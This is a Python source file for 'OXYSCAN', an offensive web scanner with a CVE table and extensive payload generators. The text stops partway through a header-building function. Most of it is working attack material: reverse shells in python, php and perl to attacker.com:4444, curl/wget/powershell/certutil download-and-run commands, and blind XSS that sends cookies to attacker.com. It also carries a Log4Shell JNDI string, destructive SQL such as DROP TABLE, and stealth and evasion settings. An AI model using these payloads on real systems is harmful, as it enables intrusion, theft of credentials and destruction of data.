#!/usr/bin/env python3
# OXYSCAN v13.0 - Ultimate Deep Vulnerability Scanner with CVE Detection & HTML Reports

import os
import sys
import json
import socket
import asyncio
import aiohttp
import subprocess
import threading
import hashlib
import base64
import random
import string
import re
import time
import dns.resolver
import ssl
import ipaddress
import signal
import csv
import zlib
import pickle
import marshal
import struct
import binascii
import html
import urllib3
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode
from collections import defaultdict, deque, OrderedDict
from typing import List, Dict, Set, Tuple, Optional, Any, Generator
import cloudscraper
from bs4 import BeautifulSoup, Comment
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import tldextract
import whois
import argparse
from datetime import datetime, timedelta
import logging
from colorama import init, Fore, Style, Back
import xml.etree.ElementTree as ET
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import jwt
import paramiko
from ftplib import FTP
import telnetlib
import smtplib
import poplib
import imaplib
import ldap3
import pymysql
import psycopg2
import redis
import pymongo
import sqlite3
import psutil
import nmap
import scapy.all as scapy
from OpenSSL import SSL, crypto
import dns.flags
import dns.rdatatype
import dns.rrset
import dns.zone
import dns.query
import dns.reversename
import dns.update
import dns.tsigkeyring
from dns.exception import DNSException
import concurrent.futures
import multiprocessing
import queue
import select
import fcntl
import termios
import tty
import pty
import resource
import gc
import inspect
import ast
import dis
import types
import importlib
import pkgutil
import pydoc
import zipfile
import tarfile
import gzip
import bz2
import lzma
import io
import tempfile
import shutil
import stat
import pwd
import grp
import getpass
import platform
import cpuinfo
import GPUtil
import netifaces
import ifaddr
import pyroute2
import netaddr
import iptools
import ipwhois
import maxminddb
import geoip2.database
import socketio
import websocket
import websockets
import stomp
import pika
import kafka
import zmq
import thrift
import avro
import protobuf
import msgpack
import cbor2
import yaml
import toml
import configparser
import xmltodict
import defusedxml
import defusedxml.cElementTree
import defusedxml.minidom
import defusedxml.pulldom
import defusedxml.sax
import defusedxml.xmlrpc
import lxml.etree
import lxml.html
import cssutils
import tinycss
import cssselect
import selectorlib
import parsel
import pyquery
import jmespath
import jsonpath
import dpath
import glom
import pandas
import numpy

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global configuration
CONFIG = {
    'max_depth': 15,
    'max_workers': 300,
    'timeout': 45,
    'retries': 7,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http/yandex.com/bots)',
        'Twitterbot/1.0',
        'facebookexternalhit/1.1'
    ],
    'common_ports': [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 9000, 9042, 27017, 28017, 5000, 5432, 6379, 9200, 9300],
    'proxy': None,
    'tor_proxy': 'socks5h://127.0.0.1:9050',
    'i2p_proxy': 'http://127.0.0.1:4444',
    'random_delay': (0.1, 3.0),
    'max_requests_per_second': 100,
    'stealth_mode': True,
    'evasion_level': 'extreme'
}

# CVE Database with years and exploit references
CVE_DATABASE = {
    "CVE-2021-41773": {"year": 2021, "name": "Apache HTTP Server Path Traversal", "severity": "CRITICAL", "cvss": 9.8, "technology": "Apache"},
    "CVE-2021-42013": {"year": 2021, "name": "Apache HTTP Server RCE", "severity": "CRITICAL", "cvss": 9.8, "technology": "Apache"},
    "CVE-2022-23943": {"year": 2022, "name": "Apache mod_sed Memory Corruption", "severity": "HIGH", "cvss": 8.1, "technology": "Apache"},
    "CVE-2022-22721": {"year": 2022, "name": "Apache HTTP Server DoS", "severity": "MEDIUM", "cvss": 5.3, "technology": "Apache"},
    "CVE-2021-23017": {"year": 2021, "name": "NGINX DNS Resolver DoS", "severity": "HIGH", "cvss": 7.5, "technology": "Nginx"},
    "CVE-2019-20372": {"year": 2019, "name": "NGINX Stack-based Buffer Overflow", "severity": "HIGH", "cvss": 8.1, "technology": "Nginx"},
    "CVE-2018-16843": {"year": 2018, "name": "NGINX HTTP/2 Memory Corruption", "severity": "HIGH", "cvss": 7.5, "technology": "Nginx"},
    "CVE-2017-7529": {"year": 2017, "name": "NGINX Integer Overflow", "severity": "HIGH", "cvss": 7.5, "technology": "Nginx"},
    "CVE-2022-4230": {"year": 2022, "name": "WordPress SQL Injection", "severity": "CRITICAL", "cvss": 9.8, "technology": "WordPress"},
    "CVE-2022-3594": {"year": 2022, "name": "WordPress Stored XSS", "severity": "HIGH", "cvss": 8.8, "technology": "WordPress"},
    "CVE-2022-21661": {"year": 2022, "name": "WordPress SQL Injection", "severity": "CRITICAL", "cvss": 9.8, "technology": "WordPress"},
    "CVE-2022-21662": {"year": 2022, "name": "WordPress Object Injection", "severity": "HIGH", "cvss": 8.8, "technology": "WordPress"},
    "CVE-2021-44228": {"year": 2021, "name": "Log4Shell", "severity": "CRITICAL", "cvss": 10.0, "technology": "Log4j"},
    "CVE-2023-0662": {"year": 2023, "name": "PHP Windows Remote Code Execution", "severity": "CRITICAL", "cvss": 9.8, "technology": "PHP"},
    "CVE-2022-31629": {"year": 2022, "name": "PHP Buffer Overflow", "severity": "HIGH", "cvss": 8.1, "technology": "PHP"},
    "CVE-2021-21708": {"year": 2021, "name": "PHP Use-After-Free", "severity": "HIGH", "cvss": 8.1, "technology": "PHP"},
    "CVE-2021-45046": {"year": 2021, "name": "Log4j 2.15.0 DoS", "severity": "CRITICAL", "cvss": 9.0, "technology": "Java"},
    "CVE-2021-45105": {"year": 2021, "name": "Log4j 2.16.0 DoS", "severity": "HIGH", "cvss": 7.5, "technology": "Java"},
    "CVE-2020-14750": {"year": 2020, "name": "Oracle WebLogic RCE", "severity": "CRITICAL", "cvss": 9.8, "technology": "Java"},
    "CVE-2022-32212": {"year": 2022, "name": "Node.js HTTP Request Smuggling", "severity": "HIGH", "cvss": 8.2, "technology": "Node.js"},
    "CVE-2021-22931": {"year": 2021, "name": "Node.js Use-After-Free", "severity": "HIGH", "cvss": 8.1, "technology": "Node.js"},
    "CVE-2022-0847": {"year": 2022, "name": "Dirty Pipe", "severity": "HIGH", "cvss": 7.8, "technology": "Linux/Docker"},
    "CVE-2021-41091": {"year": 2021, "name": "Docker Container Escape", "severity": "HIGH", "cvss": 7.5, "technology": "Docker"},
    "CVE-2022-3172": {"year": 2022, "name": "Kubernetes API Server DoS", "severity": "HIGH", "cvss": 7.5, "technology": "Kubernetes"},
    "CVE-2020-8559": {"year": 2020, "name": "Kubernetes Man-in-the-Middle", "severity": "MEDIUM", "cvss": 6.8, "technology": "Kubernetes"},
    "CVE-2021-3449": {"year": 2021, "name": "OpenSSL DoS", "severity": "MEDIUM", "cvss": 5.9, "technology": "OpenSSL"},
    "CVE-2014-0160": {"year": 2014, "name": "Heartbleed", "severity": "CRITICAL", "cvss": 7.5, "technology": "OpenSSL"},
    "CVE-2023-27522": {"year": 2023, "name": "Drupal SQL Injection", "severity": "CRITICAL", "cvss": 9.8, "technology": "Drupal"},
    "CVE-2022-25265": {"year": 2022, "name": "Joomla! SQL Injection", "severity": "CRITICAL", "cvss": 9.8, "technology": "Joomla"},
    "CVE-2021-21315": {"year": 2021, "name": "GitLab RCE", "severity": "CRITICAL", "cvss": 9.9, "technology": "GitLab"},
    "CVE-2022-30190": {"year": 2022, "name": "Follina MSDT RCE", "severity": "CRITICAL", "cvss": 7.8, "technology": "Windows"},
    "CVE-2021-34527": {"year": 2021, "name": "PrintNightmare", "severity": "CRITICAL", "cvss": 8.8, "technology": "Windows"},
    "CVE-2020-1472": {"year": 2020, "name": "Zerologon", "severity": "CRITICAL", "cvss": 10.0, "technology": "Windows"},
    "CVE-2019-0708": {"year": 2019, "name": "BlueKeep RDP RCE", "severity": "CRITICAL", "cvss": 9.8, "technology": "Windows"},
    "CVE-2017-0144": {"year": 2017, "name": "EternalBlue SMB RCE", "severity": "CRITICAL", "cvss": 9.3, "technology": "Windows"},
}

# Technology fingerprints with CVE mapping
TECH_FINGERPRINTS = {
    "Apache": {
        "headers": ["Server: Apache", "Server: Apache/2"],
        "body_patterns": ["Apache", "Powered by Apache"],
        "cves": ["CVE-2021-41773", "CVE-2021-42013", "CVE-2022-23943", "CVE-2022-22721"]
    },
    "Nginx": {
        "headers": ["Server: nginx"],
        "body_patterns": ["nginx"],
        "cves": ["CVE-2021-23017", "CVE-2019-20372", "CVE-2018-16843", "CVE-2017-7529"]
    },
    "WordPress": {
        "headers": ["X-Powered-By: WordPress"],
        "body_patterns": ["wp-content", "wp-includes", "WordPress"],
        "cves": ["CVE-2022-4230", "CVE-2022-3594", "CVE-2022-21661", "CVE-2022-21662"]
    },
    "PHP": {
        "headers": ["X-Powered-By: PHP"],
        "body_patterns": [".php", "PHP Version"],
        "cves": ["CVE-2023-0662", "CVE-2022-31629", "CVE-2021-21708"]
    },
    "Java": {
        "headers": ["Server: Apache Tomcat", "X-Powered-By: JSP", "X-Powered-By: Servlet"],
        "body_patterns": ["JSP", "Servlet", "java.lang"],
        "cves": ["CVE-2021-45046", "CVE-2021-45105", "CVE-2020-14750"]
    },
    "Node.js": {
        "headers": ["X-Powered-By: Express"],
        "body_patterns": ["node.js", "express"],
        "cves": ["CVE-2022-32212", "CVE-2021-22931"]
    },
    "Docker": {
        "headers": ["Docker", "dockerd"],
        "body_patterns": ["Docker"],
        "cves": ["CVE-2022-0847", "CVE-2021-41091"]
    },
    "OpenSSL": {
        "headers": [],
        "body_patterns": ["OpenSSL"],
        "cves": ["CVE-2021-3449", "CVE-2014-0160"]
    },
    "Drupal": {
        "headers": ["X-Generator: Drupal"],
        "body_patterns": ["Drupal", "drupal.org"],
        "cves": ["CVE-2023-27522"]
    },
    "Joomla": {
        "headers": ["X-Powered-By: Joomla"],
        "body_patterns": ["joomla", "Joomla"],
        "cves": ["CVE-2022-25265"]
    }
}

class CVEDetector:
    """Advanced CVE detection engine"""
    
    def __init__(self):
        self.cve_db = CVE_DATABASE
        self.tech_fingerprints = TECH_FINGERPRINTS
        self.exploit_db = self.load_exploit_database()
        
    def load_exploit_database(self):
        """Load exploit database"""
        exploits = {
            "CVE-2021-41773": {
                "type": "Path Traversal",
                "exploit": "curl -v --path-as-is 'http://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
                "description": "Apache 2.4.49 Path Traversal to RCE"
            },
            "CVE-2021-44228": {
                "type": "RCE",
                "exploit": "${jndi:ldap://attacker.com/exploit}",
                "description": "Log4Shell Remote Code Execution"
            },
            "CVE-2021-34527": {
                "type": "RCE",
                "exploit": "Use PrintNightmare PoC",
                "description": "Windows Print Spooler RCE"
            },
            "CVE-2020-1472": {
                "type": "Privilege Escalation",
                "exploit": "zerologon.py DC_NAME DC_IP",
                "description": "Netlogon Elevation of Privilege"
            }
        }
        return exploits
    
    def detect_technology_cves(self, technologies):
        """Detect CVEs based on technologies"""
        detected_cves = []
        
        for tech in technologies:
            if tech in self.tech_fingerprints:
                for cve_id in self.tech_fingerprints[tech]["cves"]:
                    if cve_id in self.cve_db:
                        cve_info = self.cve_db[cve_id].copy()
                        cve_info["id"] = cve_id
                        cve_info["technology"] = tech
                        if cve_id in self.exploit_db:
                            cve_info["exploit"] = self.exploit_db[cve_id]
                        detected_cves.append(cve_info)
        
        return detected_cves
    
    def detect_vulnerability_cves(self, vulnerability_type, evidence):
        """Detect CVEs based on vulnerability type"""
        detected_cves = []
        
        # Map vulnerability types to potential CVEs
        vuln_cve_map = {
            "sqli": ["CVE-2022-4230", "CVE-2022-21661"],
            "xss": ["CVE-2022-3594"],
            "rce": ["CVE-2021-44228", "CVE-2021-34527", "CVE-2020-1472"],
            "path_traversal": ["CVE-2021-41773"],
            "lfi": ["CVE-2021-41773"],
            "xxe": ["CVE-2019-17571"],
            "ssrf": ["CVE-2021-29441"],
            "deserialization": ["CVE-2019-17571"]
        }
        
        if vulnerability_type in vuln_cve_map:
            for cve_id in vuln_cve_map[vulnerability_type]:
                if cve_id in self.cve_db:
                    cve_info = self.cve_db[cve_id].copy()
                    cve_info["id"] = cve_id
                    cve_info["matched_vulnerability"] = vulnerability_type
                    if cve_id in self.exploit_db:
                        cve_info["exploit"] = self.exploit_db[cve_id]
                    detected_cves.append(cve_info)
        
        return detected_cves
    
    def generate_cve_report(self, cves):
        """Generate CVE report"""
        if not cves:
            return None
        
        report = {
            "total": len(cves),
            "critical": sum(1 for c in cves if c.get("severity") == "CRITICAL"),
            "high": sum(1 for c in cves if c.get("severity") == "HIGH"),
            "medium": sum(1 for c in cves if c.get("severity") == "MEDIUM"),
            "low": sum(1 for c in cves if c.get("severity") == "LOW"),
            "cves": cves
        }
        
        return report

class NucleiStyleScanner:
    """Nuclei-style vulnerability scanner with template matching"""
    
    def __init__(self):
        self.templates = self.load_templates()
        self.cve_detector = CVEDetector()
        
    def load_templates(self):
        """Load vulnerability templates"""
        templates = {
            "xss": {
                "name": "Cross-Site Scripting",
                "severity": "HIGH",
                "description": "XSS allows execution of JavaScript in victim's browser",
                "matchers": [
                    {"type": "word", "words": ["<script>alert", "onerror=", "onload="], "condition": "or"}
                ],
                "tags": ["xss", "javascript", "web"]
            },
            "sqli": {
                "name": "SQL Injection",
                "severity": "CRITICAL",
                "description": "SQL Injection allows database manipulation",
                "matchers": [
                    {"type": "word", "words": ["sql", "mysql", "syntax", "error"], "condition": "or"}
                ],
                "tags": ["sqli", "database", "web"]
            },
            "lfi": {
                "name": "Local File Inclusion",
                "severity": "HIGH",
                "description": "LFI allows reading local files",
                "matchers": [
                    {"type": "word", "words": ["root:x:", "/etc/passwd", "BEGIN RSA"], "condition": "or"}
                ],
                "tags": ["lfi", "file", "web"]
            },
            "rce": {
                "name": "Remote Code Execution",
                "severity": "CRITICAL",
                "description": "RCE allows command execution on server",
                "matchers": [
                    {"type": "word", "words": ["uid=", "gid=", "www-data", "root"], "condition": "or"}
                ],
                "tags": ["rce", "command", "web"]
            },
            "ssrf": {
                "name": "Server-Side Request Forgery",
                "severity": "HIGH",
                "description": "SSRF allows making requests from server",
                "matchers": [
                    {"type": "word", "words": ["127.0.0.1", "localhost", "169.254.169.254"], "condition": "or"}
                ],
                "tags": ["ssrf", "network", "web"]
            },
            "xxe": {
                "name": "XML External Entity",
                "severity": "HIGH",
                "description": "XXE allows reading files via XML parser",
                "matchers": [
                    {"type": "word", "words": ["<!DOCTYPE", "ENTITY", "SYSTEM"], "condition": "or"}
                ],
                "tags": ["xxe", "xml", "web"]
            }
        }
        return templates
    
    def scan_response(self, response, payload, vulnerability_type):
        """Scan response for vulnerability indicators"""
        if vulnerability_type not in self.templates:
            return False
        
        template = self.templates[vulnerability_type]
        text = response.text.lower()
        headers = str(response.headers).lower()
        
        for matcher in template["matchers"]:
            if matcher["type"] == "word":
                words = matcher["words"]
                condition = matcher.get("condition", "or")
                
                if condition == "or":
                    if any(word.lower() in text or word.lower() in headers for word in words):
                        return True
                elif condition == "and":
                    if all(word.lower() in text or word.lower() in headers for word in words):
                        return True
        
        return False

class AdvancedPayloadGenerator:
    """Advanced payload generator with context-aware mutations"""
    
    def __init__(self):
        self.payloads = self.generate_all_payloads()
        self.contexts = ["html", "javascript", "url", "sql", "xml", "json", "ldap", "os"]
        
    def generate_all_payloads(self):
        """Generate comprehensive payload database"""
        payloads = {}
        
        # XSS payloads
        payloads["xss"] = self.generate_xss_payloads()
        
        # SQLi payloads  
        payloads["sqli"] = self.generate_sqli_payloads()
        
        # Command Injection payloads
        payloads["cmdi"] = self.generate_cmdi_payloads()
        
        # Path Traversal payloads
        payloads["path_traversal"] = self.generate_path_traversal_payloads()
        
        # SSRF payloads
        payloads["ssrf"] = self.generate_ssrf_payloads()
        
        # XXE payloads
        payloads["xxe"] = self.generate_xxe_payloads()
        
        # SSTI payloads
        payloads["ssti"] = self.generate_ssti_payloads()
        
        # Host Header Injection payloads
        payloads["host_header"] = self.generate_host_header_payloads()
        
        # Open Redirect payloads
        payloads["open_redirect"] = self.generate_open_redirect_payloads()
        
        # CRLF Injection payloads
        payloads["crlf"] = self.generate_crlf_payloads()
        
        # Prototype Pollution payloads
        payloads["proto_pollution"] = self.generate_proto_pollution_payloads()
        
        # GraphQL Injection payloads
        payloads["graphql"] = self.generate_graphql_payloads()
        
        # JWT Attacks payloads
        payloads["jwt"] = self.generate_jwt_payloads()
        
        # NoSQL Injection payloads
        payloads["nosqli"] = self.generate_nosqli_payloads()
        
        return payloads
    
    def generate_xss_payloads(self):
        """Generate XSS payloads for different contexts"""
        payloads = []
        
        # HTML context payloads
        html_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<details ontoggle=alert(1)>',
            '<select onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<object data=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>',
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        ]
        
        # JavaScript context payloads
        js_payloads = [
            '";alert(1);//',
            "';alert(1);//",
            '`;alert(1);//',
            '</script><script>alert(1)</script>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'JaVaScRiPt:alert(1)',
        ]
        
        # URL context payloads
        url_payloads = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
        ]
        
        # Event handler payloads
        event_payloads = [
            'onclick=alert(1)',
            'onmouseover=alert(1)',
            'onmousedown=alert(1)',
            'onmouseup=alert(1)',
            'onkeydown=alert(1)',
            'onkeypress=alert(1)',
            'onkeyup=alert(1)',
            'onfocus=alert(1)',
            'onblur=alert(1)',
            'onchange=alert(1)',
            'onsubmit=alert(1)',
            'onreset=alert(1)',
            'onselect=alert(1)',
            'onload=alert(1)',
            'onunload=alert(1)',
            'onerror=alert(1)',
            'onresize=alert(1)',
            'onscroll=alert(1)',
        ]
        
        # Polyglot payloads - FIXED: Properly escaped backticks
        polyglot_payloads = [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
            '\'"><img src=x onerror=alert(1);>',
            'javascript:"\'"/*\'/*"/*\'/**/;alert(1)//',
        ]
        
        # Blind XSS payloads
        blind_payloads = [
            '<script>fetch(\'http://attacker.com/?c=\'+document.cookie)</script>',
            '<img src=x onerror="fetch(\'http://attacker.com/?c=\'+document.cookie)">',
            '<script>new Image().src=\'http://attacker.com/?c=\'+document.cookie</script>',
        ]
        
        payloads.extend(html_payloads)
        payloads.extend(js_payloads)
        payloads.extend(url_payloads)
        payloads.extend(event_payloads)
        payloads.extend(polyglot_payloads)
        payloads.extend(blind_payloads)
        
        return list(set(payloads))
    
    def generate_sqli_payloads(self):
        """Generate SQL injection payloads"""
        payloads = []
        
        # Basic payloads
        basic = [
            "'",
            "''",
            "`",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1' /*",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1 /*",
        ]
        
        # Union-based payloads
        union = [
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL #",
            "' UNION SELECT NULL /*",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3 #",
            "' UNION SELECT 1,2,3 /*",
            "' UNION SELECT database(),user(),version() --",
            "' UNION SELECT database(),user(),version() #",
            "' UNION SELECT database(),user(),version() /*",
        ]
        
        # Error-based payloads
        error = [
            "' AND EXTRACTVALUE(0,CONCAT(0x7e,USER())) --",
            "' AND UPDATEXML(0,CONCAT(0x7e,USER()),0) --",
            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),0) --",
        ]
        
        # Time-based blind payloads
        time_based = [
            "' OR SLEEP(5) --",
            "' OR SLEEP(5) #",
            "' OR SLEEP(5) /*",
            "' OR BENCHMARK(1000000,MD5('test')) --",
            "' OR pg_sleep(5) --",
            "' OR WAITFOR DELAY '0:0:5' --",
        ]
        
        # Boolean-based blind payloads
        boolean = [
            "' AND 1=1 --",
            "' AND 1=1 #",
            "' AND 1=1 /*",
            "' AND 1=2 --",
            "' AND 1=2 #",
            "' AND 1=2 /*",
        ]
        
        # Stacked queries payloads
        stacked = [
            "'; DROP TABLE users --",
            "'; DELETE FROM users --",
            "'; UPDATE users SET password='hacked' --",
        ]
        
        payloads.extend(basic)
        payloads.extend(union)
        payloads.extend(error)
        payloads.extend(time_based)
        payloads.extend(boolean)
        payloads.extend(stacked)
        
        return list(set(payloads))
    
    def generate_cmdi_payloads(self):
        """Generate command injection payloads"""
        payloads = []
        
        # Basic injections
        basics = [
            ';id',
            '|id',
            '`id`',
            '$(id)',
            '||id',
            '&&id',
            '&id',
            '|id|',
            ';id;',
            '`id`;',
            '$(id);',
        ]
        
        # Advanced injections
        advanced = [
            ';curl http://attacker.com/shell.sh | sh',
            ';wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh',
            ';python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
            ';php -r \'$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
            ';perl -e \'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        ]
        
        # Windows injections
        windows = [
            '|dir',
            ';dir',
            '`dir`',
            '$(dir)',
            '||dir',
            '&&dir',
            '&dir',
            ';powershell -c "iwr http://attacker.com/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1; iex C:\\Windows\\Temp\\shell.ps1"',
            ';certutil -urlcache -split -f http://attacker.com/shell.exe C:\\Windows\\Temp\\shell.exe & C:\\Windows\\Temp\\shell.exe',
        ]
        
        payloads.extend(basics)
        payloads.extend(advanced)
        payloads.extend(windows)
        
        return list(set(payloads))
    
    def generate_path_traversal_payloads(self):
        """Generate path traversal payloads"""
        payloads = []
        
        # Linux paths
        linux = [
            '../../../../etc/passwd',
            '../../../../etc/shadow',
            '../../../../etc/hosts',
            '../../../../etc/issue',
            '../../../../etc/motd',
            '../../../../etc/group',
            '../../../../etc/sudoers',
            '../../../../var/log/auth.log',
            '../../../../var/log/syslog',
            '../../../../var/www/html/index.php',
            '../../../../home/user/.bash_history',
            '../../../../root/.bash_history',
            '../../../../proc/self/environ',
            '../../../../proc/self/cmdline',
        ]
        
        # Windows paths
        windows = [
            '..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\Windows\\System32\\config\\SAM',
            '..\\..\\..\\..\\Windows\\win.ini',
            '..\\..\\..\\..\\Windows\\system.ini',
            '..\\..\\..\\..\\inetpub\\wwwroot\\web.config',
        ]
        
        # Encoded paths
        encoded = [
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%5c..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts',
        ]
        
        # Null byte injections
        null_bytes = [
            '../../../../etc/passwd%00',
            '../../../../etc/passwd\x00',
            '../../../../etc/passwd%00.jpg',
            '../../../../etc/passwd\x00.jpg',
        ]
        
        payloads.extend(linux)
        payloads.extend(windows)
        payloads.extend(encoded)
        payloads.extend(null_bytes)
        
        return list(set(payloads))
    
    def generate_ssrf_payloads(self):
        """Generate SSRF payloads"""
        payloads = [
            'http://127.0.0.1:22',
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'gopher://127.0.0.1:25/_HELO%20attacker.com',
            'dict://127.0.0.1:6379/info',
            'file:///etc/passwd',
            'http://[::1]:80/',
            'http://0.0.0.0:80/',
        ]
        return payloads
    
    def generate_xxe_payloads(self):
        """Generate XXE payloads"""
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%int;%trick;]>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]
        return payloads
    
    def generate_ssti_payloads(self):
        """Generate SSTI payloads"""
        payloads = [
            '{{7*7}}',
            '{{config}}',
            '{{self.__dict__}}',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
            '${7*7}',
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '{$smarty.version}',
            '{php}echo `id`;{/php}',
        ]
        return payloads
    
    def generate_host_header_payloads(self):
        """Generate Host header injection payloads"""
        payloads = [
            'evil.com',
            'localhost',
            '127.0.0.1',
            '0.0.0.0',
            '169.254.169.254',
            '[::1]',
            'metadata.google.internal',
            'evil.com:80',
            'localhost:443',
            '127.0.0.1:8080',
            'evil.com\r\nX-Forwarded-Host: evil.com',
            'evil.com\r\nX-Original-URL: /admin',
        ]
        return payloads
    
    def generate_open_redirect_payloads(self):
        """Generate open redirect payloads"""
        payloads = [
            '//evil.com',
            '\\evil.com',
            '/\\evil.com',
            'http://evil.com',
            'https://evil.com',
            '//evil.com@attacker.com',
            '/redirect?url=evil.com',
            '/out?url=http://evil.com',
            '/logout?next=https://evil.com',
            '/login?redirect=//evil.com',
        ]
        return payloads
    
    def generate_crlf_payloads(self):
        """Generate CRLF injection payloads"""
        payloads = [
            '%0d%0aX-Injected: header',
            '%0d%0aX-Forwarded-For: 127.0.0.1',
            '%0d%0aX-Original-URL: /admin',
            '%0d%0aX-Rewrite-URL: /admin',
            '%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>',
        ]
        return payloads
    
    def generate_proto_pollution_payloads(self):
        """Generate prototype pollution payloads"""
        payloads = [
            '{"__proto__":{"isAdmin":true}}',
            'constructor[prototype][polluted]=true',
            'Object.prototype.polluted=true',
        ]
        return payloads
    
    def generate_graphql_payloads(self):
        """Generate GraphQL injection payloads"""
        payloads = [
            '{"query":"query { __schema { types { name fields { name } } } }"}',
            '{"query":"mutation { deleteUser(id: 1) { id } }"}',
            '{"query":"query { users { id email password } }"}',
            'fragment x on Query { __typename } query { ...x }',
        ]
        return payloads
    
    def generate_jwt_payloads(self):
        """Generate JWT attack payloads"""
        payloads = [
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
            '{"alg":"none"}',
            '{"alg":"HS256","typ":"JWT"}',
            '{"alg":"RS256","typ":"JWT","kid":"../../../../../../dev/null"}',
        ]
        return payloads
    
    def generate_nosqli_payloads(self):
        """Generate NoSQL injection payloads"""
        payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            'admin\' || \'1\'==\'1',
            'admin\' && \'1\'==\'1',
        ]
        return payloads

class UltimateScanner:
    """Ultimate web vulnerability scanner with CVE detection"""
    
    def __init__(self, max_workers=300):
        self.max_workers = max_workers
        self.payload_gen = AdvancedPayloadGenerator()
        self.nuclei_scanner = NucleiStyleScanner()
        self.cve_detector = CVEDetector()
        self.session = self.create_stealth_session()
        self.results = {}
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        self.visited = set()
        self.start_time = time.time()
        
    def create_stealth_session(self):
        """Create stealthy session"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=5,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD"],
            respect_retry_after_header=True
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,
            pool_maxsize=100,
            pool_block=False
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.verify = False
        session.headers.update(self.generate_random_headers())
        
        return session
    
    def generate_random_headers(self):
        """Generate random headers"""
        headers = {
            'User-Agent': random.choice(CONFIG['user_agents']),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
